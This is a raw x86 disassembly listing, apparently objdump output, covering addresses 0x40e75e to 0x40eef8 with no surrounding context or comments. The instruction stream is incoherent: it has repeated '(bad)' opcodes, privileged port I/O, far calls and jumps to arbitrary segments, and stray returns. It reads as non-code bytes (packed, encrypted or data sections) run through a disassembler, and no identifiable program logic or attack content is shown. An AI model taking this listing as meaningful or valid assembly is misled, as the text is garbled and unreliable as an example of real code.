  40e75e:	xor    DWORD PTR [edi],esp
  40e760:	repnz mov WORD PTR [esi+esi*1-0x43],?
  40e765:	xchg   DWORD PTR [esi],esi
  40e767:	push   0xc932140e
  40e76c:	iret   
  40e76d:	push   ebp
  40e76e:	push   ebp
  40e76f:	fs jns 0x40e70c
  40e772:	leave  
  40e773:	pop    ebp
  40e774:	or     al,0x3e
  40e776:	xor    DWORD PTR ds:[edi+0x34a606f2],esp
  40e77d:	jmp    0x40e708
  40e77f:	cmp    ecx,DWORD PTR [edx+0x67]
  40e782:	dec    ebx
  40e783:	das    
  40e784:	fmul   DWORD PTR [ebx]
  40e786:	xchg   edx,eax
  40e787:	(bad)  
  40e788:	cmp    dh,BYTE PTR [edx+0x76b93015]
  40e78e:	mov    BYTE PTR [ecx-0x3b2cd2b2],bl
  40e794:	sub    eax,DWORD PTR [edi-0x73a16abd]
  40e79a:	mov    ds:0x2f2a4340,eax
  40e79f:	mov    esi,DWORD PTR [ebx-0x53]
  40e7a2:	es push esp
  40e7a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7a5:	sbb    al,0x98
  40e7a7:	pop    edx
  40e7a8:	rcl    BYTE PTR [ecx+0x55f6ac9e],1
  40e7ae:	test   al,0x89
  40e7b0:	sub    DWORD PTR ds:0x85ad7afe,ecx
  40e7b6:	jno    0x40e78e
  40e7b8:	inc    edx
  40e7b9:	sahf   
  40e7ba:	test   esi,ecx
  40e7bc:	lods   eax,DWORD PTR ds:[esi]
  40e7bd:	dec    edi
  40e7be:	dec    edx
  40e7bf:	fist   WORD PTR [ebx+0x31]
  40e7c2:	sbb    al,bl
  40e7c4:	aam    0x2d
  40e7c6:	adc    eax,0xe0b049c9
  40e7cb:	xchg   esp,esi
  40e7cd:	ss out dx,eax
  40e7cf:	push   ebp
  40e7d0:	dec    esp
  40e7d1:	mov    DWORD PTR [edi-0x2336893f],edx
  40e7d7:	mov    dh,0x54
  40e7d9:	push   0x34faa724
  40e7de:	retf   
  40e7df:	and    BYTE PTR [edi-0x5668a54d],ah
  40e7e5:	mov    al,BYTE PTR [ebp-0x3a]
  40e7e8:	add    eax,0x6df699ba
  40e7ed:	stos   DWORD PTR es:[edi],eax
  40e7ee:	add    BYTE PTR cs:[ecx+0x2ef3cca8],0x42
  40e7f6:	mov    cl,0x56
  40e7f8:	daa    
  40e7f9:	daa    
  40e7fa:	jle    0x40e7d5
  40e7fc:	xor    al,0x2f
  40e7fe:	call   0xf210:0x74e17faa
  40e805:	lds    esi,FWORD PTR [edx]
  40e807:	clc    
  40e808:	test   al,0x8d
  40e80a:	add    dl,BYTE PTR [eax]
  40e80c:	mov    DWORD PTR [ebx+0x2f],edx
  40e80f:	jne    0x40e7f4
  40e811:	into   
  40e812:	mov    eax,ds:0x4294516f
  40e817:	popf   
  40e818:	jle    0x40e7a7
  40e81a:	mov    WORD PTR [edx+eax*2-0x5a2de857],ss
  40e821:	mov    WORD PTR [ecx-0x30],?
  40e824:	pusha  
  40e825:	ret    
  40e826:	outs   dx,BYTE PTR ds:[esi]
  40e827:	mov    eax,0x8deb9cd6
  40e82c:	mov    dh,0x0
  40e82e:	adc    ch,BYTE PTR [eax+0x7]
  40e831:	pop    ds
  40e832:	adc    eax,0x3ca27331
  40e837:	mov    ch,0x37
  40e839:	rol    DWORD PTR [ebx+0x4f],0xae
  40e83d:	inc    ebp
  40e83e:	push   ds
  40e83f:	cdq    
  40e840:	jge    0x40e871
  40e842:	mov    WORD PTR [edx],cs
  40e844:	dec    eax
  40e845:	aaa    
  40e846:	push   edi
  40e847:	cmp    al,0x83
  40e849:	dec    ebp
  40e84a:	aas    
  40e84b:	jb     0x40e837
  40e84d:	push   0x7d4f0216
  40e852:	fdivr  QWORD PTR [eax-0x54]
  40e855:	add    esp,DWORD PTR es:[esi+0x2a9a304f]
  40e85c:	dec    esi
  40e85d:	push   ebp
  40e85e:	cli    
  40e85f:	out    dx,al
  40e860:	(bad)  
  40e861:	aam    0x2b
  40e863:	bound  esp,QWORD PTR [eax+eiz*8+0x20fc27cd]
  40e86a:	test   eax,0x2967acd8
  40e86f:	xor    bh,BYTE PTR [eax-0x72f37948]
  40e875:	mov    ecx,DWORD PTR [edi]
  40e877:	je     0x40e7fc
  40e879:	dec    eax
  40e87a:	stos   DWORD PTR es:[edi],eax
  40e87b:	sbb    BYTE PTR [ebp+0x49],dh
  40e87e:	test   DWORD PTR [edx-0x9],esi
  40e881:	aaa    
  40e882:	mov    dh,ah
  40e884:	out    0x6a,eax
  40e886:	add    BYTE PTR [ebp-0x34599765],al
  40e88c:	mov    DWORD PTR [esi+eax*1],edx
  40e88f:	fwait
  40e890:	rcr    BYTE PTR [ebx],0xcc
  40e893:	popa   
  40e894:	sub    ch,BYTE PTR [esi+0x5]
  40e897:	bound  ebp,QWORD PTR [ebx]
  40e899:	pop    ecx
  40e89a:	dec    edx
  40e89b:	mov    ds:0x3ae9c377,eax
  40e8a0:	loopne 0x40e846
  40e8a2:	(bad)  
  40e8a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8a4:	pop    ebp
  40e8a5:	jo     0x40e8a4
  40e8a7:	dec    ecx
  40e8a8:	sbb    al,0x23
  40e8aa:	mov    ds:0x212161d3,al
  40e8af:	int3   
  40e8b0:	add    ebx,0xfffffffc
  40e8b3:	and    DWORD PTR [ecx],ebx
  40e8b5:	mov    cl,0x8c
  40e8b7:	dec    ebx
  40e8b8:	sti    
  40e8b9:	cmp    eax,DWORD PTR [edi]
  40e8bb:	xchg   edx,eax
  40e8bc:	out    0x85,eax
  40e8be:	dec    ebx
  40e8bf:	push   0xe466f28a
  40e8c4:	jno    0x40e8e2
  40e8c6:	dec    eax
  40e8c7:	pop    edx
  40e8c8:	jmp    0x40e89f
  40e8ca:	retf   0xe09e
  40e8cd:	fsubp  st(5),st
  40e8cf:	lds    ecx,FWORD PTR [esi-0x54]
  40e8d2:	mov    DWORD PTR [ebx+0x49],edx
  40e8d5:	test   dh,ch
  40e8d7:	mov    ebp,0x70e025a3
  40e8dc:	cmp    dh,BYTE PTR ds:[eax-0x4c]
  40e8e0:	inc    esp
  40e8e1:	jb     0x40e867
  40e8e3:	adc    al,0x2c
  40e8e5:	push   es
  40e8e6:	leave  
  40e8e7:	dec    ecx
  40e8e8:	cmp    eax,0xbe563036
  40e8ed:	push   fs
  40e8ef:	push   esi
  40e8f0:	mov    ebp,0x6142e7b8
  40e8f5:	ins    BYTE PTR es:[edi],dx
  40e8f6:	inc    edx
  40e8f7:	lods   al,BYTE PTR ds:[esi]
  40e8f8:	call   0x9844:0x86e42b23
  40e8ff:	sub    al,0x98
  40e901:	pop    eax
  40e902:	adc    ch,BYTE PTR [eax]
  40e904:	mov    ds:0x9bbf3e91,al
  40e909:	sub    DWORD PTR [esi-0x2d],ebp
  40e90c:	(bad)  
  40e90d:	ror    ah,1
  40e90f:	sbb    eax,0x363ca7f0
  40e914:	pop    ebx
  40e915:	sbb    eax,0x6acfc73f
  40e91a:	mov    ebp,0x4a95d82a
  40e91f:	xor    ecx,DWORD PTR [ecx-0x67]
  40e922:	daa    
  40e923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e924:	test   DWORD PTR [ebx],ebx
  40e926:	sub    BYTE PTR [edi+eiz*1],bl
  40e929:	mov    esi,0x575a6fa2
  40e92e:	sar    BYTE PTR [edx-0x521b4fe6],cl
  40e934:	adc    edi,DWORD PTR [eax+0x2ec93ab]
  40e93a:	mov    bh,0xa
  40e93c:	push   0x3e9dd338
  40e941:	pop    ss
  40e942:	outs   dx,BYTE PTR ds:[esi]
  40e943:	inc    esp
  40e944:	jae    0x40e90c
  40e946:	cmc    
  40e947:	sub    eax,0xa70f1158
  40e94c:	cmp    ecx,DWORD PTR [eax-0x48f5e1]
  40e952:	pop    ebp
  40e953:	mov    WORD PTR [ebx+0x2a02017a],?
  40e959:	inc    edi
  40e95a:	xchg   BYTE PTR [edi+0x4e],dh
  40e95d:	pop    eax
  40e95e:	jmp    0x40e935
  40e960:	jmp    0x78c5:0xe0e7c931
  40e967:	sub    DWORD PTR [edi+0x1855ac8],0x68
  40e96e:	dec    esi
  40e96f:	jnp    0x40e9b1
  40e971:	stos   BYTE PTR es:[edi],al
  40e972:	test   BYTE PTR [ecx-0x2be2309a],bh
  40e978:	and    bh,al
  40e97a:	mov    ss,WORD PTR [edx+0x569f6b5b]
  40e980:	arpl   bx,bx
  40e982:	cmp    DWORD PTR [esi-0x7367a369],esi
  40e988:	pusha  
  40e989:	push   0x45
  40e98b:	push   ds
  40e98c:	cmp    eax,0x80b212c7
  40e991:	jbe    0x40e94e
  40e993:	lods   al,BYTE PTR ds:[esi]
  40e994:	in     al,dx
  40e995:	inc    eax
  40e996:	xor    eax,0x28d57635
  40e99b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e99c:	aam    0xf9
  40e99e:	dec    ecx
  40e99f:	and    BYTE PTR [eax+eax*2],bh
  40e9a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a3:	test   al,0x1d
  40e9a5:	popa   
  40e9a6:	mov    DWORD PTR [ecx],edi
  40e9a8:	pop    ss
  40e9a9:	inc    edx
  40e9aa:	loope  0x40e9cd
  40e9ac:	sahf   
  40e9ad:	stc    
  40e9ae:	seta   BYTE PTR [edi-0x5f17241f]
  40e9b5:	jo     0x40e9ad
  40e9b7:	mov    ah,0x9b
  40e9b9:	rol    BYTE PTR [ebp-0x57],0xa5
  40e9bd:	mov    bh,0xae
  40e9bf:	(bad)  
  40e9c0:	jb     0x40ea38
  40e9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9c3:	jmp    0x40e9d0
  40e9c5:	lods   al,BYTE PTR cs:[esi]
  40e9c7:	mov    eax,0xe2b7e685
  40e9cc:	or     bl,BYTE PTR [ecx]
  40e9ce:	mov    WORD PTR [edi],es
  40e9d0:	leave  
  40e9d1:	push   DWORD PTR [ecx]
  40e9d3:	in     al,0xc0
  40e9d5:	cli    
  40e9d6:	push   esi
  40e9d7:	rcr    DWORD PTR [ecx-0x2b47e7c0],0x73
  40e9de:	daa    
  40e9df:	ss xchg edi,eax
  40e9e1:	jmp    0xbcd4:0xc68f36b8
  40e9e8:	adc    cl,BYTE PTR ds:0xf7f73266
  40e9ee:	mov    WORD PTR [esi+0x2c68f6b3],fs
  40e9f4:	or     ch,bh
  40e9f6:	mov    eax,0x14ac43c6
  40e9fb:	xor    al,0xab
  40e9fd:	ficom  DWORD PTR [edi]
  40e9ff:	ins    BYTE PTR es:[edi],dx
  40ea00:	aad    0x26
  40ea02:	xchg   ecx,eax
  40ea03:	ins    BYTE PTR es:[edi],dx
  40ea04:	ror    dh,1
  40ea06:	mov    bl,0xf
  40ea08:	adc    eax,0xa2265dd7
  40ea0d:	gs xchg ecx,eax
  40ea0f:	sub    eax,DWORD PTR [ebx]
  40ea11:	stc    
  40ea12:	shr    ch,0x86
  40ea15:	and    eax,0xed0e6e62
  40ea1a:	mov    eax,0x61a30ad7
  40ea1f:	test   BYTE PTR [eax-0x236c101f],0xa0
  40ea26:	pop    es
  40ea27:	jne    0x40ea2b
  40ea29:	pop    edx
  40ea2a:	rcl    dl,cl
  40ea2c:	sub    dl,bl
  40ea2e:	or     bl,dh
  40ea30:	test   BYTE PTR [esi-0x177eb046],0x7b
  40ea37:	popa   
  40ea38:	push   esi
  40ea39:	jp     0x40ea9e
  40ea3b:	and    al,0xa7
  40ea3d:	mov    cs,edx
  40ea3f:	inc    BYTE PTR [ecx+eiz*2+0x7b7e7f46]
  40ea46:	xor    eax,0xd189d25
  40ea4b:	mov    dl,dh
  40ea4d:	mov    edi,0x20b72476
  40ea52:	test   eax,0xb2caa20f
  40ea57:	mov    DWORD PTR [esi+0x7e],0x3282b31a
  40ea5e:	inc    esi
  40ea5f:	loope  0x40ea00
  40ea61:	mov    ebp,0x7f32bdf0
  40ea66:	and    esi,edi
  40ea68:	popf   
  40ea69:	sbb    al,0xae
  40ea6b:	cwde   
  40ea6c:	xchg   ebp,eax
  40ea6d:	add    esi,DWORD PTR [ecx-0x28e53124]
  40ea73:	mov    dl,0xd9
  40ea75:	or     eax,0xd386101
  40ea7a:	push   esi
  40ea7b:	pop    ds
  40ea7c:	sbb    al,0xe0
  40ea7e:	mov    ah,0x28
  40ea80:	dec    ebp
  40ea81:	mov    si,0x7432
  40ea85:	sti    
  40ea86:	sub    al,0xd5
  40ea88:	push   ss
  40ea89:	pop    ss
  40ea8a:	in     al,dx
  40ea8b:	or     DWORD PTR ds:0xcaa000c9,eax
  40ea91:	sbb    ah,BYTE PTR [ebp+0x43]
  40ea94:	mov    ebx,tr1
  40ea97:	je     0x40ea44
  40ea99:	inc    ecx
  40ea9a:	or     eax,0xede59090
  40ea9f:	jp     0x40eaac
  40eaa1:	clc    
  40eaa2:	dec    edx
  40eaa3:	enter  0x5402,0x1
  40eaa7:	jecxz  0x40ead3
  40eaa9:	cdq    
  40eaaa:	out    dx,eax
  40eaab:	cs ds inc ebp
  40eaae:	out    dx,eax
  40eaaf:	mov    al,0xc1
  40eab1:	mov    bl,0x3a
  40eab3:	in     al,dx
  40eab4:	pop    es
  40eab5:	jmp    0x4ea7:0x7d2b9fe9
  40eabc:	inc    esp
  40eabd:	sub    edi,DWORD PTR [edx+0x72]
  40eac0:	sub    BYTE PTR ds:0x85f524ab,0x73
  40eac7:	pusha  
  40eac8:	and    ebx,DWORD PTR [ebp-0xb392d86]
  40eace:	add    BYTE PTR [esi-0x43],bh
  40ead1:	xchg   edi,eax
  40ead2:	mov    ds:0x5fa3b0fb,eax
  40ead7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ead8:	stos   BYTE PTR es:[edi],al
  40ead9:	imul   edx,DWORD PTR [esi+0x77339813],0x11ca30e4
  40eae3:	push   eax
  40eae4:	(bad)  
  40eae6:	and    esi,edx
  40eae8:	scas   al,BYTE PTR es:[edi]
  40eae9:	pop    esp
  40eaea:	(bad)  
  40eaec:	mov    BYTE PTR [edx+0x4f8ce0eb],cl
  40eaf2:	inc    edi
  40eaf3:	popa   
  40eaf4:	scas   eax,DWORD PTR es:[edi]
  40eaf5:	imul   edx,DWORD PTR [esi],0x53
  40eaf8:	jle    0x40eb32
  40eafa:	push   ebp
  40eafb:	ja     0x40eb16
  40eafd:	push   esi
  40eafe:	and    ah,BYTE PTR [edx+0x329e372b]
  40eb04:	arpl   WORD PTR [esi+0x3e],cx
  40eb07:	mov    ebp,0x3b33d6e7
  40eb0c:	mov    edi,0x5188ab21
  40eb11:	adc    al,0xb6
  40eb13:	jbe    0x40eb39
  40eb15:	lahf   
  40eb16:	mov    cl,0x13
  40eb18:	in     eax,dx
  40eb19:	pop    esi
  40eb1a:	cmp    eax,0x653ac524
  40eb1f:	lock test DWORD PTR [edx-0x2e14a154],ebx
  40eb26:	outs   dx,DWORD PTR ds:[esi]
  40eb27:	pop    esi
  40eb28:	adc    eax,eax
  40eb2a:	outs   dx,DWORD PTR ds:[esi]
  40eb2b:	add    ah,BYTE PTR [edi+0x52]
  40eb2e:	xchg   esi,eax
  40eb2f:	clc    
  40eb30:	ins    BYTE PTR es:[edi],dx
  40eb31:	in     al,dx
  40eb32:	mov    ebx,DWORD PTR [esi]
  40eb34:	push   ss
  40eb35:	in     eax,dx
  40eb36:	out    0xb7,al
  40eb38:	xchg   esi,eax
  40eb39:	xor    ch,BYTE PTR [ebp+0x2342d382]
  40eb3f:	fldenv [ebx+0x5a]
  40eb42:	push   edi
  40eb43:	push   ebp
  40eb44:	sbb    eax,0x40989527
  40eb49:	pop    edx
  40eb4a:	or     BYTE PTR [esi-0x27],dh
  40eb4d:	aad    0xb
  40eb4f:	mov    bl,0x4c
  40eb51:	mov    ecx,0x73572737
  40eb56:	sub    DWORD PTR [edi-0xb508b39],edx
  40eb5c:	add    DWORD PTR [edi+0x7819d0b5],esi
  40eb62:	retf   0xbcba
  40eb65:	push   ebp
  40eb66:	push   edx
  40eb67:	cmp    ah,BYTE PTR [esi+0xa5249a]
  40eb6d:	and    al,0xb2
  40eb6f:	rol    BYTE PTR [ebx+ebx*4+0x38],cl
  40eb73:	ins    DWORD PTR es:[edi],dx
  40eb74:	popf   
  40eb75:	clc    
  40eb76:	jns    0x40eb53
  40eb78:	clc    
  40eb79:	sbb    al,0xf2
  40eb7b:	mov    dh,0x93
  40eb7d:	mov    dh,0xaa
  40eb7f:	loop   0x40eb92
  40eb81:	loopne 0x40eb4d
  40eb83:	scas   eax,DWORD PTR es:[edi]
  40eb84:	xchg   edx,eax
  40eb85:	shr    BYTE PTR ds:0xad1801b2,1
  40eb8b:	ss pop ecx
  40eb8d:	ins    DWORD PTR es:[edi],dx
  40eb8e:	leave  
  40eb8f:	imul   DWORD PTR ds:0xefbdc962
  40eb95:	and    al,0x36
  40eb97:	xchg   edx,eax
  40eb98:	scas   eax,DWORD PTR es:[edi]
  40eb99:	inc    esi
  40eb9a:	mov    bl,0xed
  40eb9c:	jge    0x40ec00
  40eb9e:	pop    es
  40eb9f:	pop    ss
  40eba0:	cs dec edi
  40eba2:	jg     0x40ebfc
  40eba4:	and    DWORD PTR [ecx],edx
  40eba6:	pusha  
  40eba7:	sub    BYTE PTR [eax],bh
  40eba9:	jbe    0x40eb41
  40ebab:	cli    
  40ebac:	xchg   DWORD PTR [ecx],ebx
  40ebae:	inc    edx
  40ebaf:	rcr    DWORD PTR [edx+0x31],1
  40ebb2:	test   BYTE PTR [ebx+0x30d5a59],dl
  40ebb8:	pop    ss
  40ebb9:	ret    
  40ebba:	imul   BYTE PTR [ebp+0x2111075]
  40ebc0:	fild   QWORD PTR [ecx-0x390ecd37]
  40ebc6:	jnp    0x40eb8d
  40ebc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebc9:	dec    edx
  40ebca:	push   es
  40ebcb:	cmp    eax,ecx
  40ebcd:	test   eax,0xaefa92f5
  40ebd2:	sbb    ch,BYTE PTR ds:0xb95edb05
  40ebd8:	inc    edx
  40ebd9:	mov    eax,0x26ef4942
  40ebde:	loop   0x40eb8d
  40ebe0:	(bad)  
  40ebe1:	jno    0x40ec1d
  40ebe3:	test   eax,0x333332c
  40ebe8:	fdiv   QWORD PTR [ecx-0x1aa2e621]
  40ebee:	in     al,0xe9
  40ebf0:	add    edx,DWORD PTR [bx]
  40ebf3:	retf   
  40ebf4:	jo     0x40eb95
  40ebf6:	sbb    eax,0xf6a2a4ef
  40ebfb:	(bad)  [eax+0x328dbf45]
  40ec01:	xchg   ebp,eax
  40ec02:	imul   edi,DWORD PTR [eax+0x57596680],0xffffffd5
  40ec09:	mov    esi,0x524b03fe
  40ec0e:	das    
  40ec0f:	std    
  40ec10:	jns    0x40eb93
  40ec12:	mov    ds:0x6c7869ba,al
  40ec17:	pop    ss
  40ec18:	xchg   DWORD PTR ds:[ecx],eax
  40ec1b:	mov    ch,BYTE PTR [ebx-0xe16e8be]
  40ec21:	arpl   WORD PTR [ecx+ebp*8-0x70826e09],sp
  40ec28:	mov    ds:0xd0ad6eb,eax
  40ec2d:	pop    ebx
  40ec2e:	or     eax,DWORD PTR [edi-0x147d812a]
  40ec34:	jb     0x40ebe1
  40ec36:	ret    0x929b
  40ec39:	xlat   BYTE PTR ds:[ebx]
  40ec3a:	xor    esi,DWORD PTR [esi+0x2f]
  40ec3d:	mov    bh,0x3e
  40ec3f:	test   DWORD PTR [ebx+esi*2-0x5b31a91d],0x86b359de
  40ec4a:	out    0x28,al
  40ec4c:	adc    BYTE PTR [edx],bl
  40ec4e:	xor    ebp,DWORD PTR [ecx+ebx*2+0x1b4a80ad]
  40ec55:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec57:	add    esp,DWORD PTR [esi]
  40ec59:	sbb    dl,0x5a
  40ec5c:	loop   0x40eca7
  40ec5e:	pop    edx
  40ec5f:	sub    eax,0x52c1632f
  40ec64:	xchg   edx,eax
  40ec65:	cdq    
  40ec66:	adc    DWORD PTR [eax+0x192acde0],ecx
  40ec6c:	jns    0x40ebf1
  40ec6e:	fxam   
  40ec70:	push   edx
  40ec71:	sbb    ebp,DWORD PTR [ebp+ebp*2-0x6c5a52f3]
  40ec78:	add    bl,BYTE PTR [ebx-0x5b10c1cb]
  40ec7e:	hlt    
  40ec7f:	and    eax,0x6e1a2989
  40ec84:	jne    0x40ec4f
  40ec86:	mov    edx,edx
  40ec88:	imul   eax,esi,0x2e86b84e
  40ec8e:	scas   al,BYTE PTR es:[edi]
  40ec8f:	dec    eax
  40ec90:	mov    ds:0x46a8ecfc,eax
  40ec95:	les    eax,FWORD PTR [edi+0x32]
  40ec98:	jae    0x40ec4f
  40ec9a:	jecxz  0x40ec48
  40ec9c:	adc    BYTE PTR [eax],ah
  40ec9e:	pop    ebx
  40ec9f:	mov    cs,WORD PTR [ebx+0x1d7dd1]
  40eca5:	ins    BYTE PTR es:[edi],dx
  40eca6:	cli    
  40eca7:	pop    ebx
  40eca8:	push   es
  40eca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecaa:	cs xchg edx,eax
  40ecac:	mov    edx,0xef4b1e8e
  40ecb1:	outs   dx,DWORD PTR ds:[esi]
  40ecb2:	into   
  40ecb3:	aaa    
  40ecb4:	sbb    DWORD PTR [ebx],eax
  40ecb6:	push   0xffffff94
  40ecb8:	mov    esp,0x96240dad
  40ecbd:	jg     0x40ed08
  40ecbf:	or     ebp,edi
  40ecc1:	cmc    
  40ecc2:	or     edx,ebp
  40ecc4:	dec    ecx
  40ecc5:	inc    ebp
  40ecc6:	add    DWORD PTR [esi],0x2b
  40ecc9:	rcr    BYTE PTR [ebp+0x18],cl
  40eccc:	pop    ecx
  40eccd:	dec    eax
  40ecce:	pop    edx
  40eccf:	popa   
  40ecd0:	mov    ds:0xcea4a194,eax
  40ecd5:	mov    ebx,0x152ad46a
  40ecda:	imul   ebp,DWORD PTR [ebp+0x0],0xfffffff4
  40ecde:	mov    edx,0xb231d3e9
  40ece3:	adc    DWORD PTR [ebx-0x2d4dc4b],eax
  40ece9:	or     eax,0x8afdd063
  40ecee:	sbb    eax,0x4e923446
  40ecf3:	mov    cl,0x5f
  40ecf5:	jne    0x40ece2
  40ecf7:	les    ebx,FWORD PTR ds:0x82b4d83a
  40ecfd:	fisttp QWORD PTR [eax]
  40ecff:	mov    cl,0xb9
  40ed01:	pop    es
  40ed02:	and    al,0xbf
  40ed04:	mov    cl,0x51
  40ed06:	jmp    0x40ec93
  40ed08:	and    eax,esp
  40ed0a:	dec    edx
  40ed0b:	mov    ebx,0x72bca6fb
  40ed10:	shl    DWORD PTR [ebp-0x10987b1e],0x37
  40ed17:	lods   al,BYTE PTR ds:[esi]
  40ed18:	adc    eax,0xa613b612
  40ed1d:	xchg   edi,eax
  40ed1e:	inc    eax
  40ed1f:	push   esi
  40ed20:	loope  0x40ed3f
  40ed22:	or     al,0x8f
  40ed24:	fadd   DWORD PTR [eax+0x23]
  40ed27:	lock mov ebx,0xb6bb9323
  40ed2d:	inc    ecx
  40ed2e:	dec    esp
  40ed2f:	mov    ah,0x6b
  40ed31:	inc    ebp
  40ed32:	fstp   QWORD PTR [ebx-0x48]
  40ed35:	mov    al,ds:0x81c661c7
  40ed3a:	mov    esp,ecx
  40ed3c:	sbb    eax,0x3306828e
  40ed41:	(bad)  
  40ed42:	push   ebp
  40ed43:	inc    esi
  40ed44:	jb     0x40ed2c
  40ed46:	and    al,0x2d
  40ed48:	mov    bl,0xf1
  40ed4a:	shl    BYTE PTR [edi-0x24],cl
  40ed4d:	aad    0xf6
  40ed4f:	mov    esi,0xf6cc0792
  40ed54:	gs dec ebp
  40ed56:	scas   eax,DWORD PTR es:[edi]
  40ed57:	hlt    
  40ed58:	out    dx,al
  40ed59:	mov    ecx,0xb8754ff0
  40ed5e:	and    eax,0xe09db25d
  40ed63:	dec    ebx
  40ed64:	dec    esi
  40ed65:	imul   esp,DWORD PTR [ebp-0x46a95c9d],0xffffffad
  40ed6c:	jae    0x40edea
  40ed6e:	ret    0x7e77
  40ed71:	out    0xd9,al
  40ed73:	cmp    eax,0x44811d6f
  40ed78:	lods   eax,DWORD PTR ds:[esi]
  40ed79:	shl    BYTE PTR ds:0x869323fd,1
  40ed7f:	out    dx,al
  40ed80:	push   0xcfe55b6d
  40ed85:	mul    cl
  40ed87:	das    
  40ed88:	adc    al,0xd8
  40ed8a:	pop    eax
  40ed8b:	adc    DWORD PTR [edx+0x791bc793],edi
  40ed91:	call   0xb62c:0x2d07c703
  40ed98:	es stc 
  40ed9a:	sahf   
  40ed9b:	adc    DWORD PTR [ebp-0x4a958fb6],edi
  40eda1:	clc    
  40eda2:	dec    edi
  40eda3:	ins    BYTE PTR es:[edi],dx
  40eda4:	jp     0x40ed99
  40eda6:	outs   dx,DWORD PTR ds:[esi]
  40eda7:	frstor [esi]
  40eda9:	ret    0xbc38
  40edac:	or     eax,0x75b78903
  40edb1:	push   ds
  40edb2:	mov    eax,ds:0x9510ca4c
  40edb7:	(bad)  
  40edb8:	into   
  40edb9:	retf   0x1754
  40edbc:	jnp    0x40ee30
  40edbe:	cwde   
  40edbf:	mov    ebp,DWORD PTR [ebx-0x1a]
  40edc2:	adc    ebp,0xf8d2c0d8
  40edc8:	push   edi
  40edc9:	cld    
  40edca:	mov    esp,0xcb7a03d0
  40edcf:	and    DWORD PTR [ecx],ecx
  40edd1:	nop
  40edd2:	pop    edi
  40edd3:	retf   
  40edd4:	fs push edi
  40edd6:	inc    BYTE PTR [edx-0x2d2e560d]
  40eddc:	and    eax,0xd50596e3
  40ede1:	push   ecx
  40ede2:	or     eax,0x4e165e1c
  40ede7:	iret   
  40ede8:	(bad)  
  40ede9:	frstor [esp-0x54e497d0]
  40edf0:	and    dl,BYTE PTR [ebp-0x158a9860]
  40edf6:	daa    
  40edf7:	mov    bh,0x9
  40edf9:	mov    ds:0x9d699083,eax
  40edfe:	add    eax,0x35009c9a
  40ee03:	adc    al,0xc2
  40ee05:	lahf   
  40ee06:	lods   eax,DWORD PTR ds:[esi]
  40ee07:	or     eax,0x40426e7e
  40ee0c:	mov    ds:0xb80535a5,al
  40ee11:	push   esi
  40ee12:	and    esi,DWORD PTR [eax-0x82dbe61]
  40ee18:	inc    ebx
  40ee19:	sub    al,0xba
  40ee1b:	fwait
  40ee1c:	xlat   BYTE PTR ds:[ebx]
  40ee1d:	adc    DWORD PTR [esi],esp
  40ee1f:	(bad)  [ebp+0x1b6e222c]
  40ee25:	leave  
  40ee26:	test   al,0x7b
  40ee28:	pop    edx
  40ee29:	test   al,0xa7
  40ee2b:	pop    esi
  40ee2c:	enter  0x574c,0xaa
  40ee30:	retf   
  40ee31:	cmp    DWORD PTR [eax+0xe11b413],0xffffffd4
  40ee38:	sbb    eax,0x502fbf70
  40ee3d:	sbb    DWORD PTR [ecx+0x72],0x5a29dbf3
  40ee44:	sbb    eax,0xf76d34c8
  40ee49:	mov    cl,0x60
  40ee4b:	mov    edx,0x7a4cd5d7
  40ee50:	mov    al,ds:0x96ca48f
  40ee55:	or     esi,ecx
  40ee57:	mov    esi,0x20ef5ce4
  40ee5c:	sbb    bh,BYTE PTR [esi+0x76534d28]
  40ee62:	jo     0x40ee9d
  40ee64:	mov    esi,eax
  40ee66:	push   0xffffffee
  40ee68:	div    ebp
  40ee6a:	call   0xef72:0xaa9cf82
  40ee71:	pop    ebp
  40ee72:	scas   al,BYTE PTR es:[edi]
  40ee73:	jno    0x40eee9
  40ee75:	jecxz  0x40edf9
  40ee77:	mov    dl,0x5
  40ee79:	adc    al,BYTE PTR [edi-0x51c2b29c]
  40ee7f:	adc    esp,DWORD PTR [ebp-0x366d6ca6]
  40ee85:	out    0xbb,eax
  40ee87:	pushf  
  40ee88:	jmp    0x40ee4a
  40ee8a:	or     eax,0x3b94eabe
  40ee8f:	nop
  40ee90:	jo     0x40ef11
  40ee92:	into   
  40ee93:	inc    esi
  40ee94:	lods   eax,DWORD PTR fs:[esi]
  40ee96:	push   0x0
  40ee98:	xor    DWORD PTR [edx-0x5],0x26
  40ee9c:	xchg   ecx,eax
  40ee9d:	pop    ebx
  40ee9e:	push   cs
  40ee9f:	sbb    BYTE PTR [edx+0x2d0d895f],cl
  40eea5:	cmp    DWORD PTR [ebp+0x18],ebx
  40eea8:	aas    
  40eea9:	sub    al,0x31
  40eeab:	cdq    
  40eeac:	fs push cs
  40eeae:	outs   dx,BYTE PTR ds:[esi]
  40eeaf:	into   
  40eeb0:	jb     0x40ee6e
  40eeb2:	outs   dx,BYTE PTR ds:[esi]
  40eeb3:	mov    dl,0x13
  40eeb5:	or     al,0xe3
  40eeb7:	mul    DWORD PTR [eax-0x2c]
  40eeba:	cld    
  40eebb:	xlat   BYTE PTR ds:[ebx]
  40eebc:	or     BYTE PTR [ebp+0x1f],ch
  40eebf:	mov    eax,0xe819f3e1
  40eec4:	(bad)  
  40eec5:	leave  
  40eec6:	mov    DWORD PTR [eax+0x6],edx
  40eec9:	jbe    0x40ee59
  40eecb:	mov    WORD PTR [edx+0x158a2208],es
  40eed1:	ds and edx,DWORD PTR cs:[edi-0x75f2d92a]
  40eed9:	aad    0x2d
  40eedb:	or     DWORD PTR [ecx+0x12],esp
  40eede:	inc    esp
  40eedf:	fstp   DWORD PTR [ebp-0x9853a14]
  40eee5:	xchg   ebp,eax
  40eee6:	inc    eax
  40eee7:	jmp    0xb8bb3aa3
  40eeec:	jmp    0xf1e3dd6b
  40eef1:	and    esp,DWORD PTR [esi]
  40eef3:	out    0x7c,eax
  40eef5:	cdq    
  40eef6:	sbb    ah,BYTE PTR [ebx]
  40eef8:	pop    eax
